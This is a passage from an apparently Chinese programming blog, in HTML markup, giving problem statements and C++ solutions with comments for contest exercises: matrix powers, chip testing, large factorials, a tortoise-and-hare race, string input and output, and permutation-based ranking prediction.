class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;nums[i][j];</span><br><span class="line">res[i][j]=nums[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//0或1为特殊情况专门处理</span></span><br><span class="line"><span class="keyword">if</span>(M==<span class="number">0</span>||M==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(M==<span class="number">0</span>)<span class="comment">//0次幂就是单位矩阵，对角线为1其余为0</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i==j)</span><br><span class="line">cout&lt;&lt;<span class="number">1</span>&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cout&lt;&lt;<span class="number">0</span>&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//1次幂就是原矩阵本身</span></span><br><span class="line">cout&lt;&lt;nums[i][j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一般情况计算乘积</span></span><br><span class="line"><span class="keyword">int</span> cnt=M;</span><br><span class="line"><span class="keyword">while</span>(cnt!=<span class="number">1</span>)<span class="comment">//注意2次幂只做一次乘</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp[<span class="number">35</span>][<span class="number">35</span>];<span class="comment">//temp临时矩阵存放临时乘积</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">&#123;</span><br><span class="line">temp[i][j]=<span class="built_in">jisuan</span>(i,j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计算出临时矩阵每个位置的值后赋值给res矩阵</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">&#123;</span><br><span class="line">res[i][j]=temp[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cnt--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;res[i][j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>5.芯片测试</h1><p><strong>题目描述</strong></p><p>有n块芯片，有好有坏，已知好芯片比坏芯片多。每个芯片都能用来测试其他芯片。用好芯片测试其他芯片时，能正确给出被测试芯片是好还是坏。而用坏芯片测试其他芯片时，会随机给出好或是坏的测试结果（即此结果与被测试芯片实际的好坏无关）。给出所有芯片的测试结果，问哪些芯片是好芯片。</p><p><strong>输入</strong></p><p>输入数据第一行为一个整数n，表示芯片个数。</p><p>第二行到第n+1行为n*n的一张表，每行n个数据。表中的每个数据为0或1，在这n行中的第i行第j列（1≤i,  j≤n）的数据表示用第i块芯片测试第j块芯片时得到的测试结果，1表示好，0表示坏，i=j时一律为1（并不表示该芯片对本身的测试结果。芯片不能对本  身进行测试）。</p><p>（2≤n≤20）</p><p><strong>输出</strong></p><p>按从小到大的顺序输出所有好芯片的编号</p><p><strong>样例输入</strong></p><p><code>3  1 0 1 0 1 0 1 0 1</code></p><p><strong>样例输出</strong></p><p><code>1 3</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> nums[<span class="number">30</span>][<span class="number">30</span>];</span><br><span class="line"><span class="keyword">bool</span> isBad[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;nums[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对每列遍历，如果每个物品在所有测试结果中坏的个数大于一半那它一定是坏的(好芯片多)</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i==j)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(nums[j][i]==<span class="number">0</span>)</span><br><span class="line">sum++;</span><br><span class="line"><span class="keyword">if</span>(sum&gt;n/<span class="number">2</span>)</span><br><span class="line">isBad[i]=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!isBad[i])</span><br><span class="line">cout&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>6.阶乘计算</h1><p><strong>题目描述</strong></p><p>输入一个正整数n，输出n!的值。其中n!=1<em>2</em>3*…*n。算法描述n!可能很大，而计算机能表示的整数范围有限，需要使用高精度计算的方法。使用一个数组A来表示一个大整数a，A[0]表示a的个位，A[1]表示a的十位，依次类推。将a乘以一个整数k变为将数组A的每一个元素都乘以k，请注意处理相应的进位。首先将a设为1，然后乘2，乘3，当乘到n时，即得到了n!的值。</p><p><strong>输入</strong></p><p>输入包含一个正整数n，n&lt; =1000。</p><p><strong>输出</strong></p><p>输出n!的准确值。</p><p><strong>样例输入</strong></p><p><code>10</code></p><p><strong>样例输出</strong></p><p><code>3628800</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> A[<span class="number">3000</span>],jin[<span class="number">3000</span>];</span><br><span class="line"><span class="keyword">int</span> n,temp;</span><br><span class="line"><span class="keyword">int</span> nums=<span class="number">1</span>;<span class="comment">//记录结果数字位数  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    A[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)    <span class="comment">//遍历每个乘数</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(jin,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(jin));  <span class="comment">//将jin位数组清零</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums; j++)  <span class="comment">//遍历A的每一位</span></span><br><span class="line">        &#123;  </span><br><span class="line">            temp=A[j]*i+jin[j]; <span class="comment">//临时记录每一位与乘数相乘加上前一位的进位</span></span><br><span class="line">            <span class="keyword">if</span>(temp&gt;=<span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                jin[j+<span class="number">1</span>]=temp/<span class="number">10</span>;   <span class="comment">//若有进位保留到jin[j+1]</span></span><br><span class="line">                <span class="keyword">if</span>(j==nums<span class="number">-1</span>)   <span class="comment">//如果当前是A的最高位且乘积大于等于10才拓展位数</span></span><br><span class="line">                    nums++;</span><br><span class="line">            &#125;</span><br><span class="line">            A[j]=temp%<span class="number">10</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = nums<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;A[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了下别人的题解，优化了下代码，去掉了进位数组用一个int类型变量来记录进位</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> nums=<span class="number">1</span>,n,temp,jin;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">3000</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    a[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)   <span class="comment">//对每个乘数</span></span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;nums;j++) <span class="comment">//对A数组的每一位</span></span><br><span class="line">        &#123;   </span><br><span class="line">            temp=a[j]*i+jin;    <span class="comment">//临时记录每一位与乘数相乘加上前一位的进位</span></span><br><span class="line">            a[j]=temp%<span class="number">10</span>;   </span><br><span class="line">            jin=temp/<span class="number">10</span>;    <span class="comment">//记录进位</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">//如果当前是A的最高位且乘积大于等于10才拓展位数</span></span><br><span class="line">            <span class="keyword">if</span>(j==nums<span class="number">-1</span>&amp;&amp;temp&gt;=<span class="number">10</span>)</span><br><span class="line">                nums++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = nums<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>7.龟兔赛跑预测</h1><p><strong>题目描述</strong></p><p>话说这个世界上有各种各样的兔子和乌龟，但是  研究发现，所有的兔子和乌龟都有一个共同的特点——喜欢赛跑。于是世界上各个角落都不断在发生着乌龟和兔子的比赛，小华对此很感兴趣，于是决定研究不同兔  子和乌龟的赛跑。他发现，兔子虽然跑比乌龟快，但它们有众所周知的毛病——骄傲且懒惰，于是在与乌龟的比赛中，一旦任一秒结束后兔子发现自己领先t米或以  上，它们就会停下来休息s秒。对于不同的兔子，t，s的数值是不同的，但是所有的乌龟却是一致——它们不到终点决不停止。然而有些比赛相当漫长，全程观看会耗费大量时间，而小华发现只要在每场比赛开始后记录下兔子和乌龟的数据——兔子的速度v1（表示每秒兔子能跑v1  米），乌龟的速度v2，以及兔子对应的t，s值，以及赛道的长度l——就能预测出比赛的结果。但是小华很懒，不想通过手工计算推测出比赛的结果，于是他找  到了你——清华大学计算机系的高才生——请求帮助，请你写一个程序，对于输入的一场比赛的数据v1，v2，t，s，l，预测该场比赛的结果。</p><p><strong>输入</strong></p><p>输入只有一行，包含用空格隔开的五个正整数v1，v2，t，s，l，其中(v1,v2&lt; =100;t&lt; =300;s&lt; =10;l&lt; =10000且为v1,v2的公倍数)</p><p><strong>输出</strong></p><p>输出包含两行，第一行输出比赛结果——一个大写字母“T”或“R”或“D”，分别表示乌龟获胜，兔子获胜，或者两者同时到达终点。 第二行输出一个正整数，表示获胜者（或者双方同时）到达终点所耗费的时间（秒数）。</p><p><strong>样例输入</strong></p><p><code>10 5 5 2 20</code></p><p><strong>样例输出</strong></p><p><code>D 4</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> v1, v2, t, s, l;</span><br><span class="line"><span class="keyword">int</span> s1,s2,rest;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; t &gt;&gt; s &gt;&gt; l;</span><br><span class="line">    <span class="keyword">while</span> (++rest) &#123;</span><br><span class="line">        s1 += v1;</span><br><span class="line">        s2 += v2;</span><br><span class="line">        <span class="keyword">if</span> (s1 == l &amp;&amp; s2 == l) </span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;D&quot;</span> &lt;&lt; endl &lt;&lt; rest &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (s1 == l) </span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;R&quot;</span> &lt;&lt; endl &lt;&lt; rest &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (s2 == l) </span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;T&quot;</span> &lt;&lt; endl &lt;&lt; rest &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//关键代码，如果s1领先s2至少t米，就直接让兔子后退v1*s米</span></span><br><span class="line">        <span class="comment">//之后的循环每秒兔子再往前走v1米，经过s秒可以回到原来领先的位置</span></span><br><span class="line">        <span class="comment">//所以也就等效于兔子等待s秒的效果</span></span><br><span class="line">        <span class="keyword">if</span> (s1 - s2 &gt;= t) &#123;</span><br><span class="line">            s1 -= v1 * s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//来源：https://blog.dotcpp.com/a/67808</span></span><br></pre></td></tr></table></figure><h1>8.字符串输入输出函数</h1><p><strong>题目描述</strong></p><p>编写函数GetReal和GetString，在main函数中分别调用这两个函数。在读入一个实数和一个字符串后，将读入的结果依次用printf输出。两次输入前要输出的提示信息分别是&quot; please  input  a  number:\n”和&quot; please  input  a  string:\n&quot;</p><p><strong>样例输入</strong></p><p><code>9.56  hello</code></p><p><strong>样例输出</strong></p><p><code>please input a number: please input a string: 9.56 hello</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//题目很简单，但题目给的有问题，写的时候直接复制的提示信息一直提示格式错误</span></span><br><span class="line"><span class="comment">//看别人的题解原来是题目给的提示每个单词之间有两个空格，而实际留一个空格就行</span></span><br><span class="line"><span class="comment">//感觉这题目样例输出也有点问题，题目说的是每次输入前有提示，而样例先把两个两个提示输出了😓</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">double</span> n;</span><br><span class="line">string s;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetReal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;please input a number:\n&quot;</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;please input a string:\n&quot;</span>;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">GetReal</span>();</span><br><span class="line">    <span class="built_in">GetString</span>();</span><br><span class="line">    cout&lt;&lt;n&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;s&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>9.3000米排名预测</h1><p><strong>题目描述</strong></p><p>3000米长跑时，围观党们兴高采烈地预测着  最后的排名。因为他们来自不同的班，对所有运动员不一定都了解，于是他们分别对自己了解的一些运动员的实力作出了评估，即对部分运动员做了相对排名的预  测，并且告诉了可怜留守的班长。因为无聊，于是他们就组团去打Dota去了。比赛结束后他们向班长询问最后的排名，但班长不记得了，只记得他们中哪些人的  预测是正确的，哪些人的预测是错误的。他们想知道比赛的排名可能是什么。</p><p><strong>输入</strong></p><p>第一行两个整数n，  m，n为运动员数量，m为围观党数量。运动员编号从0到n-1。</p><p>接下来m行，每行为一个围观党的相对排名预测。每行第一个数c表示他预测的人数，后面跟着c个0~n-1的不同的数，表示他预测的运动员相对排名，最后还有一个数，0表示这个预测是错误的，1表示是正确的。</p><p>数据规模和约定  1&lt; =n&lt; =10,  2&lt; =c&lt; =n,  1&lt; =m&lt; =10，保证数据合法，且答案中排名可能数不超过20000。对于一个排名序列，一个预测是正确的，当且仅当预测的排名的相对顺序  是排名序列的一个子序列。一个预测是错误的，当且仅当这个预测不正确。</p><p><strong>输出</strong></p><p>第一行一个数k为有多少种排名的可能。 下面k行，每行一个0~n-1的排列，为某一个可能的排名，相邻的数间用空格隔开。所有排名按字典序依次输出。</p><p><strong>样例输入</strong></p><p><code>3 2  2 0 1 1  2 1 2 0</code></p><p><strong>样例输出</strong></p><p><code>2 0 2 1  2 0 1</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">10</span>][<span class="number">11</span>]; <span class="comment">//每个吃瓜群众的猜测</span></span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">10</span>];<span class="comment">//每个吃瓜群众的猜测的正确性</span></span><br><span class="line"><span class="keyword">int</span> player[<span class="number">10</span>];<span class="comment">//运动员的编号</span></span><br><span class="line"><span class="keyword">int</span> sum;<span class="comment">//记录多少种可行排名的数目</span></span><br><span class="line">string str;<span class="comment">//记录所有可能的排列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//核心函数，判断排列是否满足题意</span></span><br><span class="line"><span class="comment">//设两个指针分别遍历预测数列和要判断的数列，看哪个指针先走到头</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">judge</span><span class="params">(<span class="keyword">int</span> p[])</span> <span class="comment">//数组 p 是需要判断的一个排列</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k;  <span class="comment">//循环变量</span></span><br><span class="line">    <span class="keyword">int</span> num;   <span class="comment">//num表示吃瓜群众对几个运动员预测了成绩</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; m; i++)  <span class="comment">//循环每个吃瓜群众的预测成绩</span></span><br><span class="line">    &#123;</span><br><span class="line">        num = arr[i][<span class="number">0</span>];  <span class="comment">//赋值，arr[i][0]是吃瓜群众作了几个预测</span></span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">1</span>,k = <span class="number">0</span>; j &lt; num &amp;&amp; k &lt; n;k++)  <span class="comment">// 逻辑：需要了解是相对位置，所以遍历整个排列，如果 j 先结束则说明序列是统一的；  如果k先结束则说明序列是不统一的。</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i][j] == p[k])</span><br><span class="line">            &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j &gt;= num &amp;&amp; !flag[i]) <span class="comment">//预测正确(flag[i] = 1), 则看是否全排列等于该预测结果,不一致，则该排列不正确, reture false</span></span><br><span class="line">                                <span class="comment">//预测错误(flag[i] = 0), 则看是否全排列等于该预测结果, 一致，   则该排列不正确, return false</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(k &gt;= n &amp;&amp; j &lt; num &amp;&amp; flag[i])</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">out</span><span class="params">(<span class="keyword">int</span> p[])</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">judge</span>(p))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                str+=p[i] + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                str+=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sum++;</span><br><span class="line">            str[str.<span class="built_in">size</span>() - <span class="number">1</span>] = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(<span class="built_in">next_permutation</span>(p,p+n));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        player[i] = i;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; c;</span><br><span class="line">        arr[i][<span class="number">0</span>] = c + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span 